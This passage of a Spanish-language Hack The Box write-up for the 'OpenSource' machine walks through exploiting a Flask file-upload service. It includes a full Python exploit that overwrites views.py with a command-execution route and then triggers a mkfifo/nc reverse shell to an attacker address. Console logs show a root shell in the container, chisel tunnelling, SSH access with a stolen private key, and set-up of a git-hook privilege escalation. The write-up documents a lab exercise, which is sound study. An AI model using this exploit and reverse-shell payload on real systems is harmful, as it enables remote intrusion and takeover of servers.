</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>

<span class="kn">from</span> <span class="nn">app.utils</span> <span class="kn">import</span> <span class="n">get_file_name</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span>

<span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">app</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="n">get_file_name</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s">"public"</span><span class="p">,</span> <span class="s">"uploads"</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'success.html'</span><span class="p">,</span> <span class="n">file_url</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">host_url</span> <span class="o">+</span> <span class="s">"uploads/"</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'upload.html'</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/uploads/&lt;path:path&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">send_report</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">get_file_name</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s">"public"</span><span class="p">,</span> <span class="s">"uploads"</span><span class="p">,</span> <span class="n">path</span><span class="p">))</span>
</pre></table></code></div></div><p>Lo que observamos son las diferentes rutas del servicio web y sus respectivas funciones que se ejecutarán al acceder a estas. Además, anteriormente en el mensaje de error logramos ver que se trabaja con el archivo en la ruta <code class="language-plaintext highlighter-rouge">/app/app/views.py</code> el cuál es este mismo. Entonces…. que pasa si subimos el archivo modificandolo y logramos reemplazarlo con el original?</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Lo que haremos será agregar una nueva ruta al archivo <code class="language-plaintext highlighter-rouge">views.py</code> y con ello la funcionalidad, insertando un parametro por get, para realizar ejecución remota de comandos <strong>RCE (Remote command execution)</strong>, luego la subiremos por la aplicación <code class="language-plaintext highlighter-rouge">Upcloud</code>, pero antes de eso (g.e interceptando por <strong>Burpsuite</strong>), ya que sabemos su ruta exacta, cambiamos su nombre por aquella ruta y así reemplazará al archivo original pero con nuestra funcionalidad agregada. Para ello hice un script en <code class="language-plaintext highlighter-rouge">Python</code> para automatizar todo el proceso:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">shlex</span><span class="p">,</span> <span class="n">argparse</span><span class="p">,</span> <span class="n">time</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># testing
</span><span class="kn">import</span> <span class="nn">pdb</span>

<span class="c1"># ctrl + c (function)
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"Interruption"</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="c1"># ctrl + c (event)
</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># global variables
</span><span class="n">target_url</span> <span class="o">=</span> <span class="s">"http://10.10.11.164:80/upcloud"</span>
<span class="n">file_path_name</span> <span class="o">=</span> <span class="s">"/app/app/views.py"</span> <span class="c1"># important!
</span>
<span class="c1"># arguments
</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Reverse shell to container'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-ip'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'ip address to receive shell'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'port to receive shell'</span> <span class="p">)</span>

<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="c1"># malicious function
# - - - - - - - - - - 
#   revshell_function = """
#                app.route('/reverse')
#                def shell():
#                    return os.system(request.args.get['cmd'])
#           """
</span>
<span class="c1"># create malicious file
</span><span class="k">def</span> <span class="nf">create_file</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nb">open</span><span class="p">(</span><span class="s">'views.py'</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'views.py'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
            <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"""import os</span><span class="se">\n</span><span class="s">from app.utils import get_file_name</span><span class="se">\n</span><span class="s">from flask import render_template, request, send_file</span><span class="se">\n</span><span class="s">from app import app</span><span class="se">\n\n</span><span class="s">@app.route('/', methods=['GET', 'POST'
])</span><span class="se">\n</span><span class="s">def upload_file(): #hacked</span><span class="se">\n\t</span><span class="s">if request.method == 'POST':</span><span class="se">\n\t\t</span><span class="s">f = request.files['file']</span><span class="se">\n\t\t</span><span class="s">file_name = get_file_name(f.filename)</span><span class="se">\n\t\t</span><span class="s">file_path = os.path.join(os.getcwd(), "public", 
"uploads", file_name)</span><span class="se">\n\t\t</span><span class="s">f.save(file_path)</span><span class="se">\n\t\t</span><span class="s">return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)</span><span class="se">\n\t</span><span class="s">return render_template('upload.html')</span><span class="se">\n\n</span><span class="s">@app.
route('/uploads/&lt;path:path&gt;')</span><span class="se">\n</span><span class="s">def send_report(path):</span><span class="se">\n\t</span><span class="s">path = get_file_name(path)</span><span class="se">\n\t</span><span class="s">return send_file(os.path.join(os.getcwd(), "public", "uploads", path))</span><span class="se">\n\n</span><span class="s">@app.route('/reverse')</span><span class="se">\n</span><span class="s">def s
hell():</span><span class="se">\n\t</span><span class="s">return os.system(request.args.get('cmd'))"""</span><span class="p">)</span>

<span class="c1"># upload file with malicious function
</span><span class="k">def</span> <span class="nf">request_POST</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Getting reverse shell...'</span><span class="p">)</span>
    <span class="n">create_file</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">files</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'file'</span> <span class="p">:</span> <span class="p">(</span><span class="n">file_path_name</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s">'views.py'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">),</span> <span class="s">'text/x-python'</span><span class="p">)</span> <span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">" {} ocurred."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'File upload'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span>

<span class="c1"># get reverse shell
</span><span class="k">def</span> <span class="nf">get_shell</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Listen on PORT {} to receive the shell'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
    <span class="nb">input</span><span class="p">(</span><span class="s">'Press enter to continue'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Inserting payload to reverse shell'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="s">'http://10.10.11.164/reverse?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+{}+{}+&gt;/tmp/f'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
        <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'/usr/bin/curl {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">payload</span><span class="p">)),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">" {} ocurred."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Successful reverse shell'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting attack'</span><span class="p">)</span>
    <span class="n">get_shell</span><span class="p">(</span><span class="n">request_POST</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes descargar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tool_Opensource/reverseShell.py">https://github.com/E1P0TR0</a></p></div></blockquote><p>Ejecutamos el script <code class="language-plaintext highlighter-rouge">python3 exploit.py -ip &lt;ip-address&gt; -port &lt;local_port&gt;</code> nos ponemos en escucha por el puerto especificado y logramos entrar al contenedor como <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">──────────────────────────────────────────────────────
❯ python3 exploit.py -ip 10.10.14.181 -port 4444
[+] Starting attack: Successful reverse shell
[*] File upload
[*] Listen on PORT 4444 to receive the shell
Press enter to continue
[*] Inserting payload to reverse shell
──────────────────────────────────────────────────────
❯ rlwrap nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.164.
Ncat: Connection from 10.10.11.164:45805.
</span><span class="gp">/bin/sh: can't access tty;</span><span class="w"> </span>job control turned off
<span class="go">whoami
root
</span><span class="gp">/app #</span><span class="w"> 
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Usamos el comando <code class="language-plaintext highlighter-rouge">rlwrap</code> para de alguna manera recibir una shell un poco mas funcional, pero es mas recomendable hacer un <strong>tratamiento de la tty</strong></p></div></blockquote><p>Ya en el contenedor procedemos a hacer un reconocimiento básico y haciendo un listado del <code class="language-plaintext highlighter-rouge">/etc/passwd</code> vemos que el usuario usa una shell de Unix ligera llamada <strong>ash</strong></p><p>Viendo la configuración de la interfaz de red con <code class="language-plaintext highlighter-rouge">ifconfig</code> observamos que no nos encontramos en la máquina víctima sino en el contenedor pero que debería tener una conexión. Además observamos que nos encontramos en la red <code class="language-plaintext highlighter-rouge">172.17.0.7/16</code> y podemos asumir que la <code class="language-plaintext highlighter-rouge">172.17.0.1</code> actua como <strong>Gateway (puerta de enlace)</strong> y por ende la máquina vítima, pero qué es un <strong>Gateway</strong>?</p><blockquote><p>Gateway</p><p>Es un dispositivo, mayormente un ordenador, que actua como traductor de dos sistemas que no utilizan los mismos protocolos. También ayuda a establecer la comunicacion entre multiples entornos, osea entre equipos de diferentes redes</p></blockquote><p>Con está información y sabiendo que puertos tiene abiertos la máquina, usamos <code class="language-plaintext highlighter-rouge">nc 172.17.0.1 &lt;port&gt;</code> para validar que tiene abierto/filtrado los puertos <strong>22, 80, 3000</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">/app #</span><span class="w"> </span>nc 172.17.0.1 80 <span class="nt">-v</span>  
<span class="go">172.17.0.1 (172.17.0.1:80) open &lt;-- open port !



nc: too many output retries
</span><span class="gp">/app #</span><span class="w"> </span>nc 172.17.0.1 3000 <span class="nt">-v</span>
<span class="go">172.17.0.1 (172.17.0.1:3000) open &lt;-- open port !

HTTP/1.1 400 Bad Request
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">Connection: close

400 Bad Request

nc: too many output retries
</span><span class="gp">/app #</span><span class="w"> </span>nc 172.17.0.1 22 <span class="nt">-v</span>
<span class="go">172.17.0.1 (172.17.0.1:22) open &lt;-- open port !
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
</span></pre></table></code></div></div><p>Comprobamos que la <code class="language-plaintext highlighter-rouge">172.17.0.1</code> es la <code class="language-plaintext highlighter-rouge">10.10.11.164</code> y tenemos el puerto <strong>3000</strong> abierto pero solo tenemos una conexión desde el contenedor pero no de nuestra máquina local. Pero existe solución a eso usando la técnica de <strong>Remote port forwarding</strong> para enrutar el tráfico de la máquina víctima por su puerto <strong>3000</strong> a un puerto local nuestro <strong>(e.g 3000)</strong> y poder ver que servicio existe</p><p>Para aplicar la técnica procedemos a usar la herramienta <code class="language-plaintext highlighter-rouge">Chisel</code>:</p><blockquote><p>Instalación para disminuir considerablemente el ejecutable y mantener su funcionalidad</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="go">❯ gunzip chisel_1.7.7_linux_amd64.gz
❯ mv chisel_1.7.7_linux_amd64 chisel
❯ du -hc chisel
7.8M    chisel  	
7.8M    total		&lt;------ initial size
❯ chmod +x chisel
❯ upx chisel
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
</span><span class="gp">   8077312 -&gt;</span><span class="w">   </span>3107968   38.48%   linux/amd64   chisel                        
<span class="go">
Packed 1 file.
❯ du -hc chisel
3.0M    chisel
3.0M    total		&lt;------ final size

</span></pre></table></code></div></div><p>Ahora solo copiamos el executable a la máquina víctima y creamos el tunel:</p><blockquote><p>Aplicación de <code class="language-plaintext highlighter-rouge">Remote port forwarding</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">❯ ./chisel server -p 8080 --reverse 				&lt;------ Máquina atacante
2022/06/29 15:02:02 server: Reverse tunnelling enabled
2022/06/29 15:02:02 server: Fingerprint 1R58OXwRvuvhMHAl4v/FHZtVmD14WxmMw9BPFeAijBs=
2022/06/29 15:02:02 server: Listening on http://0.0.0.0:8080
</span><span class="gp">2022/06/29 15:02:09 server: session#</span>1: tun: proxy#R:3000<span class="o">=&gt;</span>172.17.0.1:3000: Listening
<span class="go">
────────────────────────────────────────────────────────────────────────────────────────
</span><span class="gp">/tmp #</span><span class="w"> </span>./chisel client 10.10.14.181:8080 R:3000:172.17.0.1:3000 &lt;<span class="nt">------</span> Máquina víctima
<span class="go">2022/06/29 20:02:10 client: Connecting to ws://10.10.14.181:8080
2022/06/29 20:02:11 client: Connected (Latency 108.331821ms)
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Puedes descargar la herramienta en el siguiente repositorio <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p></div></blockquote><p>Ahora entramos a nuestro <code class="language-plaintext highlighter-rouge">localhost</code> por el puerto <code class="language-plaintext highlighter-rouge">3000</code>:</p><p><img data-src="/assets/img/htb/writeups/opensource/gitea_web_rpf.png" alt="giteaWeb" data-proofer-ignore></p><p>Viendo la página y buscando en internet sabemos que <strong>Gitea</strong> es un software “opensource” de control de versiones, similar a <strong>Github</strong>. Además vemos un panel para logearnos, y probando las credenciales que también son parte de un usuario con un repositorio <strong>git</strong> logramos acceder como <code class="language-plaintext highlighter-rouge">dev01</code>. Luego logramos ver un repositorio de un <code class="language-plaintext highlighter-rouge">backup</code> de su directorio <code class="language-plaintext highlighter-rouge">home</code> y con ello su <code class="language-plaintext highlighter-rouge">private key (id_rsa)</code></p><p><img data-src="/assets/img/htb/writeups/opensource/backup_home_rpf.png" alt="backup repository" data-proofer-ignore></p><p>Ahora solo nos descargamos esa llave, le damos sus respectivos permisos como clave privada <code class="language-plaintext highlighter-rouge">chmod 600 &lt;private_key&gt;</code>, logramos logearnos y conseguir la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="go">❯ chmod 600 id_rsa
❯ ssh -i id_rsa dev01@10.10.11.164
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 29 20:42:21 UTC 2022

  System load:  0.34              Processes:              238
  Usage of /:   75.8% of 3.48GB   Users logged in:        1
  Memory usage: 25%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Last login: Wed Jun 29 18:21:55 2022 from 10.10.16.22
</span><span class="gp">-bash-4.4$</span><span class="w"> </span>find / <span class="nt">-name</span> flag.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">total 4
-rw-r----- 1 root dev01 33 Jun 29 18:12 user.txt
</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Para escalar privilegios empezamos con un reconocimiento básico del sistema operativo, ver que usuarios existen, archivos con permisos <code class="language-plaintext highlighter-rouge">SUID</code>, archivos que podemos ejecutar como usuario <code class="language-plaintext highlighter-rouge">root</code>, etc. Al final no conseguimos algo interesante y como es una máquina fácil podemos tirar de la herramienta <code class="language-plaintext highlighter-rouge">pspy</code> para listar procesos del sistema sin ser usuario <code class="language-plaintext highlighter-rouge">root</code></p><p>Lo descargamos, lo pasamos a la máquina víctima, lo ejecutamos en una ruta con permisos y encontramos algo interesante:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="gp">bash-4.4$</span><span class="w"> </span>./pspy64                                                                                                                                   <span class="o">[</span>507/507]
<span class="go">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                                                 
                                                                                                                                                              
                                                                                                                                                              
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                       
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                                                       
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                                                       
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                                                       
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                       
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                        
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                                                        
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                                                         
                   ░           ░ ░                                                                                                                            
                               ░ ░                                                                                                                            
                                                                                                                                                              
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching d
irectories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)                                                                                 
Draining file system events due to startup...                                                                                                                 
done 
*********************************************
***********************************************************
*****************************************************
2022/06/29 21:45:01 CMD: UID=0    PID=7453   | /usr/sbin/CRON -f 
2022/06/29 21:45:01 CMD: UID=0    PID=7452   | /usr/sbin/CRON -f 
2022/06/29 21:45:01 CMD: UID=0    PID=7455   | git status --porcelain 
2022/06/29 21:45:01 CMD: UID=0    PID=7454   | /bin/bash /usr/local/bin/git-sync 
2022/06/29 21:45:01 CMD: UID=???  PID=7457   | 
2022/06/29 21:45:01 CMD: UID=0    PID=7458   | git commit -m Backup for 2022-06-29 
2022/06/29 21:45:01 CMD: UID=0    PID=7461   | git push origin main 
2022/06/29 21:45:01 CMD: UID=0    PID=7462   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
*************************************************************
**************************************************
********************************************************
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes decargar la herramienta en el siguiente repositorio <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p></div></blockquote><p>Observamos que existe un proceso donde el usuario <code class="language-plaintext highlighter-rouge">root</code> está ejecutando comandos con <code class="language-plaintext highlighter-rouge">git</code>. Averiguando posibles vulnerabilidades encontramos que al utilizar <code class="language-plaintext highlighter-rouge">git hooks</code> para ejecutar comandos, pero qué es exactamente?</p><blockquote><p>Git hooks</p><p>Son scripts automatizados al utilizar comandos git, osea, se enganchan a comandos de git (g.e <strong>git commit, git add, git push</strong>)</p></blockquote><blockquote class="prompt-info"><div><p>Mas información sobre <a href="https://medium.com/@gonzaloandres.diaz/escribiendo-codigo-de-alta-calidad-en-python-parte-3-hooks-f3970a4bcdd7">Git Hooks</a></p></div></blockquote><blockquote class="prompt-info"><div><p>Página de binarios Unix que pueden ser explotados como <code class="language-plaintext highlighter-rouge">git</code> <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p></div></blockquote><p>Al iniciar un repositorio, estos scripts se almacenan en la ruta <code class="language-plaintext highlighter-rouge">.git/hooks</code> y sus respectivos nombres descriptivos <code class="language-plaintext highlighter-rouge">.sample</code> de acuerdo a la acción que realizarán. Para <strong>activar</strong> su ejecución solo debemos quitarle la terminación <code class="language-plaintext highlighter-rouge">.sample</code></p><p>Observamos que se está ejecutando <code class="language-plaintext highlighter-rouge">git commit -m ...</code>, luego se hace un <code class="language-plaintext highlighter-rouge">push</code> y un <code class="language-plaintext highlighter-rouge">git remote</code> sobre el repositorio del usuario <code class="language-plaintext highlighter-rouge">dev01</code>. Con esa información podemos deducir que debemos aplicar está explotación sobre ese repositorio que tenemos en la ruta <code class="language-plaintext highlighter-rouge">home/dev01/.git</code>, con lo cuál podemos usar el script <code class="language-plaintext highlighter-rouge">pre-commit.sample</code> almacenado en <code class="language-plaintext highlighter-rouge">/hooks</code>, insertar que se asigne <strong>permisos SUID al a la bash</strong> y luego acceder como su propietario <code class="language-plaintext highlighter-rouge">root</code> y obtener la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">/home/dev01/.git/hooks
</span><span class="gp">bash-4.4$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash 	&lt;<span class="nt">------------------------------------</span> check bash permissions <span class="o">(</span>not SUID<span class="o">)</span>
<span class="go">-rwxr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
